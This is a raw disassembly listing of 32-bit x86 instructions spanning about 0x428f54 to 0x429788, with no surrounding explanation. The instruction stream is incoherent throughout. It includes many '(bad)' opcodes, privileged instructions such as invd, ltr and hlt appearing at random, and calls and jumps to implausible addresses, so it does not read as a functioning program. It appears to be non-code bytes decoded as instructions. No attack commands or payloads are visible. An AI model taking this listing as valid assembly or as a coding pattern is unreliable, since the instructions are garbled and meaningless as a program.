  428f54:	inc    DWORD PTR [ebx]
  428f56:	adc    BYTE PTR [ecx+0x45721cc6],cl
  428f5c:	add    BYTE PTR [edi+0x9],dl
  428f5f:	call   DWORD PTR [esi]
  428f61:	and    dl,al
  428f63:	and    bh,bh
  428f65:	inc    edi
  428f67:	test   eax,edx
  428f69:	sldt   ebx
  428f6c:	cmp    DWORD PTR [eax],eax
  428f6e:	pushf  
  428f6f:	(bad)  
  428f70:	jmp    0x428f7e
  428f72:	mov    eax,edi
  428f74:	or     al,0x75
  428f76:	inc    eax
  428f77:	call   0x42867f
  428f7c:	mov    eax,eax
  428f7e:	loopne 0x428f04
  428f80:	inc    ebp
  428f81:	add    BYTE PTR [ebx+0x1451c00],cl
  428f87:	mov    eax,DWORD PTR [ebp+0x20]
  428f8a:	add    edi,ecx
  428f8c:	add    BYTE PTR [eax],ch
  428f8e:	cmp    edi,0x18
  428f91:	test   DWORD PTR [ebp+0xf],esi
  428f94:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  428f9b:	jne    0x428f9f
  428f9d:	call   0xffa18a62
  428fa2:	leave  
  428fa3:	rcr    BYTE PTR [esp+eax*4],0x55
  428fa7:	add    ah,ch
  428fa9:	add    BYTE PTR [edi-0x48fef979],dh
  428faf:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  428fb6:	inc    esp
  428fb7:	mov    ebx,DWORD PTR [eax]
  428fb9:	fcom   st(2)
  428fbb:	add    BYTE PTR [edi],bl
  428fbd:	lea    ecx,[eax-0x18]
  428fc0:	(bad)  
  428fc1:	push   DWORD PTR [ecx]
  428fc3:	call   0xffb4dd25
  428fc8:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  428fcc:	fstp   DWORD PTR [esi+ebx*8]
  428fcf:	push   ebp
  428fd0:	pop    ebp
  428fd1:	mov    esi,DWORD PTR [edx-0x38]
  428fd4:	add    DWORD PTR [eax],0x28
  428fd7:	mov    edi,DWORD PTR [ebx]
  428fd9:	xor    esi,DWORD PTR [edx+0x3]
  428fdc:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  428fe0:	pop    ebp
  428fe1:	or     al,0x4
  428fe3:	inc    ecx
  428fe4:	push   ebp
  428fe5:	(bad)  
  428fe6:	in     al,dx
  428fe7:	or     ah,ch
  428fe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428fea:	xbegin 0xffc805e0
  428ff0:	clc    
  428ff1:	adc    al,0x45
  428ff3:	idiv   BYTE PTR [ecx]
  428ff5:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  428ffc:	test   DWORD PTR [eax+0x665300f8],ebx
  429002:	add    BYTE PTR [ecx+0x66],dh
  429005:	add    eax,DWORD PTR [ebp+0x52]
  429008:	adc    eax,0x20
  42900b:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  429011:	test   DWORD PTR [eax],eax
  429013:	clc    
  429014:	data16 or al,BYTE PTR [ebp+0x45]
  429018:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  42901f:	rol    BYTE PTR [ebp+0x45],1
  429022:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  429028:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  42902e:	push   ebx
  42902f:	add    BYTE PTR [eax+0x0],dl
  429032:	push   ecx
  429033:	jge    0x429068
  429035:	add    BYTE PTR [esi+0x4],dl
  429038:	jne    0x42909f
  42903a:	mov    edx,0x457200
  42903f:	jmp    0x429003
  429041:	xor    edi,DWORD PTR [ebx]
  429043:	pop    edi
  429044:	cvtdq2ps xmm7,xmm0
  429047:	ret    0x0
  42904a:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  429050:	xor    ecx,DWORD PTR [edi]
  429052:	add    eax,DWORD PTR [ecx+0x3b]
  429055:	push   ebx
  429056:	rdpmc  
  429058:	out    0x8d,al
  42905a:	add    BYTE PTR [eax],cl
  42905c:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  429062:	ret    0x450c
  429065:	sbb    al,0x8b
  429067:	cmp    eax,esi
  429069:	or     cl,al
  42906b:	or     al,0xc2
  42906d:	pop    eax
  42906e:	inc    ebp
  42906f:	add    ecx,DWORD PTR [edi]
  429071:	add    esi,DWORD PTR [ebp+0x39]
  429074:	invd   
  429076:	jge    0x429082
  429078:	mov    eax,0x478ac0
  42907d:	cli    
  42907e:	xor    esp,ecx
  429080:	mov    ebx,0x5b8ac0
  429085:	ret    0x33
  429088:	mov    eax,0x833a8b
  42908d:	sub    BYTE PTR [ebx],al
  42908f:	inc    ebp
  429090:	data16 cmp al,bh
  429093:	pushf  
  429094:	inc    bh
  429096:	mov    esp,esp
  429098:	hlt    
  429099:	test   DWORD PTR [ebp-0x8],esi
  42909c:	mov    eax,DWORD PTR [ebp-0x14]
  42909f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  4290a5:	dec    edi
  4290a6:	or     BYTE PTR [eax],al
  4290a8:	jne    0x429033
  4290aa:	mov    esi,esp
  4290ac:	call   0x77a91c71
  4290b1:	inc    ebp
  4290b2:	mov    DWORD PTR [eax+0x984f0c],edi
  4290b8:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4290be:	add    BYTE PTR [esi+0x7d],ah
  4290c1:	inc    ebp
  4290c2:	mov    bx,WORD PTR [ebp+0x8]
  4290c6:	add    DWORD PTR [ebp+0x50],0x30c008b
  4290cd:	inc    ebp
  4290ce:	mov    bx,di
  4290d1:	lock test BYTE PTR [ecx+0x7000801],bh
  4290d8:	jge    0x42909b
  4290da:	mov    ecx,DWORD PTR [ebx-0x670613f0]
  4290e0:	cli    
  4290e1:	xor    bl,bh
  4290e3:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  4290e9:	test   BYTE PTR [eax],cl
  4290eb:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4290f2:	cmp    ebp,eax
  4290f4:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4290fb:	test   BYTE PTR [ebp+0x1],bh
  4290fe:	mov    ebx,0x458a00
  429103:	xor    esi,DWORD PTR [ebx]
  429105:	add    esp,DWORD PTR [esi-0x77]
  429108:	pop    ebp
  429109:	loopne 0x429171
  42910b:	inc    ebp
  42910c:	clc    
  42910d:	xor    edi,DWORD PTR [ebx]
  42910f:	add    esi,DWORD PTR [edx-0x77]
  429112:	data16 fdivr QWORD PTR [ebp-0x49]
  429116:	mov    ebx,0xb78afc
  42911b:	hlt    
  42911c:	xor    esi,DWORD PTR [esi]
  42911e:	data16 add BYTE PTR [ebp+0x66],bl
  429122:	data16 lock clc 
  429125:	cmp    eax,DWORD PTR ss:[eax]
  429128:	ja     0x429190
  42912a:	psubq  mm7,QWORD PTR [ebp-0x4]
  42912e:	ltr    WORD PTR [ebp+0x66]
  429132:	add    esi,eax
  429134:	add    di,WORD PTR [ebp+0x2b]
  429138:	data16 data16 jge 0x4291b9
  42913c:	mov    ebx,0xe08a8b
  429141:	jge    0x429176
  429143:	data16 data16 xor al,0x5d
  429147:	data16 data16 jne 0x429143
  42914b:	mov    edi,DWORD PTR [ebx]
  42914d:	fdiv   QWORD PTR [edx+0x7d]
  429150:	data16 data16 jge 0x429188
  429154:	mov    ebx,0x758a66
  429159:	mov    esi,0x667233
  42915e:	pop    ebp
  42915f:	or     BYTE PTR [esi+0x0],ah
  429162:	clc    
  429163:	mov    edi,DWORD PTR [ebx]
  429165:	lock ja 0x4290f3
  429168:	(bad)  
  42916a:	jge    0x429163
  42916c:	invd   
  42916e:	pop    ebp
  42916f:	add    BYTE PTR [ebx],al
  429171:	(bad)  
  429172:	cmp    di,WORD PTR [ebp+0xf]
  429176:	data16 sbb bh,BYTE PTR [ebp+0x0]
  42917a:	mov    bx,WORD PTR [ebp-0x10]
  42917e:	pop    bp
  429180:	fbstp  TBYTE PTR [ebx]
  429182:	test   DWORD PTR [ebx],eax
  429184:	add    BYTE PTR [ebx],bh
  429186:	add    BYTE PTR [esi+0x7d],ah
  429189:	jge    0x429116
  42918b:	data16 in al,dx
  42918d:	pop    ebp
  42918e:	stc    
  42918f:	bsf    ecx,DWORD PTR [ebp+0x66320098]
  429196:	mov    edi,ebx
  429198:	in     al,dx
  429199:	test   BYTE PTR [ebp+0x0],bh
  42919c:	mov    eax,DWORD PTR [eax]
  42919e:	call   0xbd3f8b2e
  4291a3:	ss cwde 
  4291a5:	add    BYTE PTR [edx],dh
  4291a7:	mov    bx,di
  4291aa:	call   0x8b4b0f3a
  4291af:	add    ebp,esp
  4291b1:	mov    bx,di
  4291b4:	jnp    0x4291dc
  4291b6:	mov    DWORD PTR [ebx+0x367df808],ecx
  4291bc:	mov    eax,DWORD PTR [eax]
  4291be:	call   0x7c3e1d29
  4291c3:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4291c9:	data16 data16 fistp WORD PTR [ebp+0xe]
  4291ce:	xor    DWORD PTR [edi-0x48fff7b0],0xfb66f403
  4291d8:	fisttp WORD PTR [ecx-0x7401f77b]
  4291de:	(bad)  
  4291df:	cld    
  4291e0:	jne    0x429218
  4291e2:	xor    eax,DWORD PTR [eax]
  4291e4:	mov    esp,DWORD PTR [esi-0x10]
  4291e7:	sti    
  4291e8:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4291ef:	data16 adc bl,bh
  4291f2:	push   ebp
  4291f3:	xor    ecx,DWORD PTR es:[ebx+0x36e4f88b]
  4291fa:	mov    WORD PTR [eax],es
  4291fc:	cwde   
  4291fd:	data16 xor bh,bl
  429200:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  429206:	mov    esp,DWORD PTR [esi-0x14]
  429209:	fisttp WORD PTR [ebx-0x3748a9f2]
  42920f:	or     al,0x2b
  429211:	mov    bh,0xba
  429213:	hlt    
  429214:	mov    bh,bl
  429216:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42921c:	dec    edi
  42921d:	or     al,0x0
  42921f:	mov    edi,DWORD PTR [ebx]
  429221:	or     BYTE PTR [ebp+0x3b],dh
  429224:	mov    ecx,DWORD PTR [edi]
  429226:	fdivr  QWORD PTR [ebx-0x7499ff83]
  42922c:	xor    al,0xd8
  42922e:	pop    bp
  429230:	lock xor esi,DWORD PTR [ebx]
  429233:	lea    esp,[esi+0x1f]
  429236:	icebp  
  429237:	jb     0x42923d
  429239:	add    al,al
  42923b:	jge    0x429249
  42923d:	mov    eax,eax
  42923f:	fsubr  st,st(3)
  429241:	pop    ebp
  429242:	mov    esi,DWORD PTR [ebx]
  429244:	in     al,0x8d
  429246:	rcr    DWORD PTR [edi],0xc2
  429249:	jb     0x4292a9
  42924b:	add    cl,cl
  42924d:	jge    0x42925b
  42924f:	mov    edx,DWORD PTR [ebp-0x20]
  429252:	in     al,dx
  429253:	pop    ebp
  429254:	data16 data16 or BYTE PTR [esi+edi*4],bh
  429259:	data16 cmp bh,BYTE PTR [ebp+0x0]
  42925d:	mov    ebp,DWORD PTR [ebx]
  42925f:	fdivr  QWORD PTR [esi+0x668a5d]
  429265:	cmp    al,0x33
  429267:	mov    si,0x4f7d
  42926b:	mov    eax,DWORD PTR [eax]
  42926d:	lock inc ebp
  42926f:	mov    esi,DWORD PTR [edi]
  429271:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  429278:	clc    
  429279:	(bad)  
  42927a:	cmp    edi,DWORD PTR [ebx]
  42927c:	je     0x42928d
  42927e:	push   ebx
  42927f:	loopne 0x429290
  429281:	dec    ecx
  429283:	mov    ebp,DWORD PTR [eax-0x1c]
  429286:	int    0xf1
  429288:	mov    esi,0x703084d
  42928d:	orps   xmm6,xmm1
  429290:	add    BYTE PTR [ebp+0x66],dh
  429293:	jmp    0x429260
  429295:	mov    eax,DWORD PTR [ebx]
  429297:	lock push ebp
  429299:	ror    DWORD PTR [ebp-0x2972feb3],1
  42929f:	or     bh,dl
  4292a1:	jb     0x4292a1
  4292a3:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4292a9:	loopne 0x4292ab
  4292ab:	jne    0x4292a9
  4292ad:	data16 add BYTE PTR [esi+eiz*2],dh
  4292b1:	mov    ecx,ebx
  4292b3:	data16 ss icebp 
  4292b6:	add    BYTE PTR [esi],dh
  4292b8:	data16 add bl,cl
  4292bb:	data16 xor dh,dl
  4292be:	add    BYTE PTR [edx],dh
  4292c0:	data16 add bl,cl
  4292c3:	enterw 0x4df1,0x19
  4292c8:	pop    edi
  4292c9:	jne    0x42924c
  4292cb:	mov    esi,DWORD PTR [edi]
  4292cd:	call   0x77b71e6e
  4292d2:	xor    ebp,DWORD PTR [ebx]
  4292d4:	lea    esp,[esi+0x48]
  4292d7:	repnz in eax,0x3b
  4292da:	add    BYTE PTR [ebp-0x37],dh
  4292dd:	xor    edx,DWORD PTR [ebp-0x15]
  4292e0:	in     al,dx
  4292e1:	xor    edx,DWORD PTR [esi+0x40]
  4292e4:	mov    DWORD PTR [edi],0x338545fc
  4292ea:	clc    
  4292eb:	add    edi,DWORD PTR [eax]
  4292ed:	pop    edi
  4292ee:	pushf  
  4292ef:	pop    ebx
  4292f0:	call   0xff4392b7
  4292f5:	mov    edi,eax
  4292f7:	push   ecx
  4292f8:	pop    es
  4292f9:	mov    edi,DWORD PTR [ebx]
  4292fb:	push   esi
  4292fc:	inc    ebx
  4292fd:	cld    
  4292fe:	js     0x429300
  429300:	popa   
  429301:	data16 (bad) 
  429303:	into   
  429304:	push   0xb900cd36
  429309:	data16 or dh,cl
  42930c:	pop    es
  42930d:	xor    ah,BYTE PTR [esi+0x0]
  429310:	add    bh,al
  429312:	cld    
  429313:	cld    
  429314:	add    BYTE PTR [ebp+0x38c3f866],al
  42931a:	ss pushf 
  42931c:	add    BYTE PTR [esi+0x66],ah
  42931f:	into   
  429320:	ret    
  429321:	pop    ebp
  429322:	add    al,0x57
  429324:	add    BYTE PTR [edi-0x723c409a],dh
  42932a:	add    edi,edi
  42932c:	jne    0x42937e
  42932e:	lea    edx,[ecx+0x1]
  429331:	mov    ebx,0xd64ff1
  429336:	sar    DWORD PTR [ebx],1
  429338:	test   BYTE PTR [ebp+0x30],dh
  42933b:	mov    DWORD PTR [esp+edi*8-0x76],esp
  42933f:	push   edi
  429340:	xor    BYTE PTR [ebx],0x3b
  429343:	mov    esi,ebx
  429345:	xor    eax,DWORD PTR [eax-0x3c73879a]
  42934b:	xor    BYTE PTR [ebp+0x64],al
  42934e:	pop    ebx
  42934f:	mov    ebx,0x9c3a37
  429354:	je     0x429381
  429356:	xor    edi,DWORD PTR [ebx+0x668a33]
  42935c:	mov    WORD PTR [ebx],?
  42935e:	xor    BYTE PTR [ebx+0x8b4f64],bh
  429364:	pop    edi
  429365:	cmp    ecx,ecx
  429367:	jne    0x4293be
  429369:	mov    ebp,esp
  42936b:	cld    
  42936c:	push   esi
  42936d:	pop    ebx
  42936e:	inc    ebp
  42936f:	stc    
  429370:	aaa    
  429371:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  429378:	clc    
  429379:	test   dl,dl
  42937b:	xor    bh,bh
  42937d:	fs pop si
  429380:	or     bl,al
  429382:	cld    
  429383:	mov    eax,DWORD PTR [eax]
  429385:	push   ecx
  429386:	push   di
  429388:	retf   0x3645
  42938b:	aaa    
  42938c:	add    BYTE PTR [esi+eiz*2+0x3285cabe],bl
  429393:	clc    
  429394:	add    BYTE PTR [ebx+0x66],bl
  429397:	dec    edx
  429399:	mov    edx,DWORD PTR [edi-0x76]
  42939c:	push   edi
  42939d:	add    al,0xb7
  42939f:	xor    al,0xba
  4293a1:	cmp    al,0x8d
  4293a3:	je     0x4293a4
  4293a5:	mov    edx,DWORD PTR [eax-0x46]
  4293a8:	push   ecx
  4293a9:	lea    edi,[ebx+0x504fff]
  4293af:	push   ecx
  4293b0:	cmp    edx,DWORD PTR [ebx+0x75]
  4293b3:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  4293b9:	add    BYTE PTR [ebx],dh
  4293bb:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4293c1:	add    BYTE PTR [ebx+esi*1+0x4f64bb30],cl
  4293c8:	mov    ebx,0x3b3a00
  4293cd:	jne    0x4293fa
  4293cf:	mov    DWORD PTR [ebx+0x728afc],edi
  4293d5:	xor    esi,DWORD PTR [ebx]
  4293d7:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  4293dd:	push   edi
  4293de:	cmp    esp,ebp
  4293e0:	jne    0x4293e2
  4293e2:	sbb    DWORD PTR [eax],0x8085c3fc
  4293e8:	clc    
  4293e9:	inc    ebx
  4293ea:	pop    ebx
  4293eb:	sti    
  4293ec:	add    eax,0xeb8bc075
  4293f1:	cld    
  4293f2:	xor    edi,DWORD PTR ds:0xf8c3855e
  4293f8:	mov    ecx,DWORD PTR [ecx+edx*2]
  4293fb:	rol    DWORD PTR [ebp-0x37],0xf
  4293ff:	mov    DWORD PTR [eax],ecx
  429401:	inc    edi
  429402:	(bad)  
  429403:	in     eax,0x4
  429405:	add    bh,bh
  429407:	(bad)  
  429408:	mov    esi,0xc38a5e
  42940d:	mov    esi,DWORD PTR [ebx]
  42940f:	push   ecx
  429410:	mov    edi,0xfc4fc7
  429415:	test   DWORD PTR [ebp-0x8],edx
  429418:	data16 cmp bh,al
  42941b:	pushf  
  42941c:	sub    ebp,eax
  42941e:	inc    ebp
  42941f:	(bad)  
  429420:	sub    edi,edi
  429422:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  429428:	inc    ebp
  429429:	add    BYTE PTR [esi+0x2b],ah
  42942c:	or     bh,BYTE PTR [edx+0xf8ac2]
  429432:	cmp    al,0x33
  429434:	mov    edi,DWORD PTR [edx+0x44f81]
  42943a:	(bad)  
  42943b:	cmp    esi,DWORD PTR [ebx]
  42943d:	je     0x4293f7
  42943f:	push   ebx
  429440:	dec    edi
  429441:	str    ecx
  429444:	cmp    ebp,DWORD PTR [eax+0x75]
  429447:	int    0x33
  429449:	mov    edi,0x789085f
  42944e:	mov    eax,DWORD PTR [esp+edi*8]
  429451:	add    cl,cl
  429453:	data16 add al,0xcb
  429456:	push   ebp
  429457:	add    ebp,esp
  429459:	jne    0x429447
  42945b:	(bad)  
  42945c:	mov    DWORD PTR [ecx],0xd685f7ec
  429462:	clc    
  429463:	xlat   BYTE PTR ds:[ebx]
  429464:	inc    ebp
  429465:	mov    edi,DWORD PTR [ecx]
  429467:	push   eax
  429468:	pushf  
  429469:	in     eax,0x8b
  42946b:	add    ah,ch
  42946d:	cld    
  42946e:	push   eax
  42946f:	add    BYTE PTR [ecx+0x66],dl
  429472:	add    eax,0x3672cb
  429477:	add    BYTE PTR [ebp+0x66],al
  42947a:	(bad)  
  42947b:	retf   
  42947c:	lock xor al,BYTE PTR [ebp+0x4566f800]
  429483:	retf   
  429484:	cmp    al,0xc8
  429486:	pushf  
  429487:	jge    0x429450
  429489:	aaa    
  42948a:	cld    
  42948b:	pushf  
  42948c:	test   DWORD PTR [edi-0x8],ebx
  42948f:	je     0x4294d6
  429491:	xor    esi,DWORD PTR ds:0x7020840
  429497:	ror    BYTE PTR [ebp-0x37],0x8d
  42949b:	push   ebp
  42949c:	add    esp,ebp
  42949e:	jb     0x42942b
  4294a0:	add    BYTE PTR [eax],cl
  4294a2:	dec    ebp
  4294a3:	mov    bh,0x81
  4294a5:	push   esi
  4294a6:	push   eax
  4294a7:	adc    DWORD PTR [ecx-0x3b],0x3698ff81
  4294ae:	xor    al,BYTE PTR [eax]
  4294b0:	mov    edx,DWORD PTR [edi+0x10]
  4294b3:	(bad)  
  4294b4:	scas   eax,DWORD PTR es:[edi]
  4294b5:	xor    bh,BYTE PTR [ebx]
  4294b7:	add    BYTE PTR [edi],cl
  4294b9:	mov    ebp,ebp
  4294bb:	cld    
  4294bc:	add    BYTE PTR [ebx],bh
  4294be:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4294c2:	dec    ebp
  4294c3:	or     BYTE PTR [ebx],ch
  4294c5:	ret    0x458b
  4294c8:	lock jmp 0x4294bc
  4294cb:	mov    ecx,DWORD PTR [eax]
  4294cd:	or     BYTE PTR [edi],al
  4294cf:	mov    ecx,eax
  4294d1:	xor    DWORD PTR [edx+0x2],0x0
  4294d5:	mov    bh,0xc1
  4294d7:	adc    BYTE PTR [eax],dh
  4294d9:	iret   
  4294da:	inc    ebp
  4294db:	mov    DWORD PTR [ebx],0x4dfff8c5
  4294e1:	inc    BYTE PTR [ebx]
  4294e3:	xor    bh,al
  4294e5:	add    BYTE PTR [ecx],dl
  4294e7:	data16 adc al,bh
  4294ea:	dec    ecx
  4294eb:	fisttp WORD PTR [ecx+0x456604c0]
  4294f1:	add    dh,BYTE PTR ds:0x75e0845
  4294f7:	ret    0x4d
  4294fa:	lea    ecx,[ebx+0x18728301]
  429500:	add    BYTE PTR [ebp+0x45],al
  429503:	cmp    cl,ch
  429505:	pushf  
  429506:	add    bh,al
  429508:	add    al,ch
  42950a:	inc    ebp
  42950b:	test   DWORD PTR [ebx-0x3eba0708],ecx
  429511:	xor    eax,0x781084d
  429516:	push   eax
  429517:	cwde   
  429518:	push   ecx
  429519:	xor    al,BYTE PTR [ecx+0x32f89889]
  42951f:	inc    ebp
  429520:	cmp    esp,DWORD PTR [eax]
  429522:	jbe    0x4294c0
  429524:	mov    eax,edi
  429526:	or     ah,dh
  429528:	inc    ebp
  429529:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  42952f:	cmp    cl,BYTE PTR [ebx-0x74747664]
  429535:	in     al,dx
  429536:	hlt    
  429537:	push   eax
  429538:	push   eax
  429539:	push   ecx
  42953a:	push   ecx
  42953b:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  429541:	cwde   
  429542:	cwde   
  429543:	xor    dh,BYTE PTR [edx]
  429545:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  42954b:	or     BYTE PTR [ebp+0x7],al
  42954e:	mov    eax,ecx
  429550:	clc    
  429551:	jb     0x429514
  429553:	add    BYTE PTR [ebp+0x55],cl
  429556:	or     DWORD PTR [edi],0xc251d150
  42955c:	add    DWORD PTR [ebx+0x320098],0x8b76453b
  429566:	mov    edi,eax
  429568:	or     cl,al
  42956a:	inc    ebp
  42956b:	dec    ebp
  42956c:	mov    eax,DWORD PTR [ecx+0x514d500c]
  429572:	or     WORD PTR [ecx],0x8998
  429577:	xor    cl,BYTE PTR [ebx+0x5076fc3b]
  42957d:	mov    edx,DWORD PTR [ecx+0x8]
  429580:	mov    eax,DWORD PTR [ebp-0x8]
  429583:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb268]
  42958a:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  429590:	inc    ebp
  429591:	dec    eax
  429592:	add    ecx,DWORD PTR [ebx+0x504df0f8]
  429598:	add    edx,DWORD PTR [ecx-0x8]
  42959b:	mov    ecx,DWORD PTR [ecx]
  42959d:	clc    
  42959e:	or     BYTE PTR [ebp+eax*2+0x45324098],al
  4295a5:	mov    ecx,ebp
  4295a7:	clc    
  4295a8:	(bad)  
  4295a9:	popf   
  4295aa:	inc    DWORD PTR [eax]
  4295ac:	ret    0x8b
  4295af:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4295b5:	mov    edi,esp
  4295b7:	hlt    
  4295b8:	test   ecx,esi
  4295ba:	clc    
  4295bb:	or     BYTE PTR [ebp+0x7],al
  4295be:	cmp    ecx,eax
  4295c0:	pushf  
  4295c1:	jb     0x4295f6
  4295c3:	add    BYTE PTR [eax-0x3f],al
  4295c6:	inc    eax
  4295c7:	daa    
  4295c8:	inc    ebp
  4295c9:	inc    ebp
  4295ca:	xor    eax,0x7f80803
  4295cf:	dec    ebp
  4295d0:	cwde   
  4295d1:	add    esi,DWORD PTR [edx]
  4295d3:	clc    
  4295d4:	cmp    DWORD PTR [ecx],ecx
  4295d6:	or     al,0x8
  4295d8:	add    al,BYTE PTR [ebp+0x2c]
  4295db:	xor    eax,0x7350845
  4295e0:	or     BYTE PTR [ebp+0x7],cl
  4295e3:	lea    ebx,[eax-0x748dcdff]
  4295e9:	add    BYTE PTR [eax*2-0x74b21438],cl
  4295f0:	mov    edx,DWORD PTR [eax]
  4295f2:	cld    
  4295f3:	dec    ebp
  4295f4:	push   eax
  4295f5:	sub    edx,DWORD PTR [ecx-0x75]
  4295f8:	add    eax,0xf172fc
  4295fd:	or     BYTE PTR [ebp+0x7],cl
  429600:	add    eax,ecx
  429602:	or     al,0x72
  429604:	add    DWORD PTR [eax],eax
  429606:	mov    ebx,0x29c2c1
  42960b:	inc    ebp
  42960c:	mov    eax,DWORD PTR [ebx]
  42960e:	cmp    eax,0x3004d1c
  429614:	xbegin 0x66c8220e
  42961a:	clc    
  42961b:	or     BYTE PTR [ebp+0x45],al
  42961e:	cmp    DWORD PTR ds:0x78b089c,esi
  429624:	adc    BYTE PTR [ebp+0x45],cl
  429627:	lea    eax,[ebp+0x33727501]
  42962d:	add    cl,ch
  42962f:	inc    ebp
  429630:	add    bl,ch
  429632:	add    BYTE PTR [ebx+0x45850845],cl
  429638:	je     0x4295c5
  42963a:	push   ebx
  42963b:	or     al,0x85
  42963d:	dec    ebp
  42963e:	std    
  42963f:	mov    bh,bh
  429641:	mov    BYTE PTR [ebp-0x75],al
  429644:	mov    edi,eax
  429646:	or     al,0x89
  429648:	inc    ebp
  429649:	clc    
  42964a:	mov    esp,esp
  42964c:	hlt    
  42964d:	call   DWORD PTR [edi-0x37]
  429650:	push   eax
  429651:	or     al,0x51
  429653:	push   ebp
  429654:	xor    ebp,esp
  429656:	mov    esi,0x457251
  42965b:	cmp    dh,al
  42965d:	pushf  
  42965e:	inc    ebp
  42965f:	(bad)  
  429660:	mov    edi,eax
  429662:	or     al,0x85
  429664:	add    al,bh
  429666:	inc    eax
  429668:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  42966c:	or     ah,bh
  42966e:	inc    eax
  42966f:	push   eax
  429670:	jmp    0x4296c3
  429672:	mov    eax,DWORD PTR ds:0xe8720c
  429678:	mov    DWORD PTR [ebp-0x8],eax
  42967b:	jne    0x4296c2
  42967d:	jmp    0x42960a
  42967f:	mov    ebp,DWORD PTR [eax]
  429681:	clc    
  429682:	retf   0xff50
  429685:	push   ecx
  429686:	mov    DWORD PTR ds:0x757210,eax
  42968c:	mov    ecx,DWORD PTR [ebp-0x4]
  42968f:	sub    esp,DWORD PTR [ebx-0x77]
  429692:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429699:	or     ah,bh
  42969b:	pop    es
  42969c:	ds cwde 
  42969e:	push   DWORD PTR [edx]
  4296a0:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4296a6:	(bad)  
  4296a7:	mov    bh,bh
  4296a9:	jmp    0x429697
  4296ab:	leave  
  4296ac:	jne    0x4296b6
  4296ae:	call   0x2f9008
  4296b3:	in     al,dx
  4296b4:	dec    ebp
  4296b5:	add    dh,BYTE PTR [ebx]
  4296b7:	add    BYTE PTR [ebx],al
  4296b9:	inc    ebp
  4296ba:	cmp    edi,DWORD PTR [eax]
  4296bc:	je     0x42965a
  4296be:	mov    eax,edi
  4296c0:	or     al,0xf0
  4296c2:	add    BYTE PTR [ebp+0x458bf845],al
  4296c8:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4296ce:	adc    al,0x7
  4296d0:	enter  0x9fc0,0xa5
  4296d4:	rol    BYTE PTR [eax],0x5e
  4296d7:	mov    ecx,ecx
  4296d9:	or     al,0xc
  4296db:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  4296e2:	jmp    0x4296e3
  4296e4:	push   ebp
  4296e5:	mov    esp,ebp
  4296e7:	cld    
  4296e8:	inc    ebp
  4296e9:	inc    ebp
  4296ea:	or     DWORD PTR [ecx+0x457dec10],0x0
  4296f1:	push   esi
  4296f2:	push   esi
  4296f3:	mov    edi,0x7af080f
  4296f8:	add    bh,al
  4296fa:	test   DWORD PTR [eax+0x3a7320f],ebx
  429700:	add    BYTE PTR [ecx+0x4540100f],cl
  429706:	mov    ebp,eax
  429708:	mov    ebp,edi
  42970a:	lock call edx
  42970d:	fcom   DWORD PTR [ebp+0x45]
  429710:	mov    eax,0x148a8b
  429715:	push   ecx
  429716:	enter  0xc145,0x83
  42971a:	cmp    cl,BYTE PTR [eax]
  42971c:	add    BYTE PTR [ebp+0x4d],al
  42971f:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429725:	call   0xffa29294
  42972a:	cmp    eax,DWORD PTR [ebp-0xc]
  42972d:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429731:	push   ebp
  429732:	(bad)
  429735:	std    
  429736:	lock push DWORD PTR [edi+0x5d08fcdb]
  42973d:	inc    ebp
  42973e:	(bad)  
  42973f:	call   0xff7c93cf
  429744:	add    al,BYTE PTR [ebp+0x37]
  429747:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  42974d:	jne    0x42974f
  42974f:	(bad)  
  429750:	cmp    edi,esp
  429752:	jne    0x429785
  429754:	mov    edi,edi
  429756:	or     BYTE PTR [ebx-0x307f0b49],cl
  42975c:	pop    ds
  42975d:	into   
  42975e:	je     0x429721
  429760:	mov    ebx,DWORD PTR [esi]
  429762:	or     BYTE PTR [ebp-0x49],al
  429765:	mov    esp,DWORD PTR [esi-0x77]
  429768:	mov    esi,0xfc451f0c
  42976d:	mov    eax,DWORD PTR [eax]
  42976f:	or     al,0x66
  429771:	sar    bl,0x3b
  429774:	xor    esi,DWORD PTR [ebp+0x66]
  429777:	xor    ecx,edi
  429779:	pop    edi
  42977a:	adc    bl,BYTE PTR [ebx+0x78]
  42977d:	ret    0xff
  429780:	cld    
  429781:	inc    ebp
  429782:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429788:	cld    
